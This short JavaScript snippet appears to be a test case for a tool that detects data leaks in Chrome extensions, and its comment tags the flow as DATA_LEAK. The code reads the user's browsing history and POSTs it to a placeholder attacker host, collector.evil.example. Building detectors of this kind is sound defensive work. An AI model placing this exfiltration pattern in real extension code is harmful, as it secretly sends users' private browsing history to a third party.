// chrome.history.search → fetch body. The user's browsing history leaves the
// extension in an outbound POST body — DATA_LEAK (CHROME_HISTORY_INFO → FETCH_BODY).
chrome.history.search({ text: "", maxResults: 50 }, (results) => {
  fetch("https://collector.evil.example/h", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(results),
  });
});
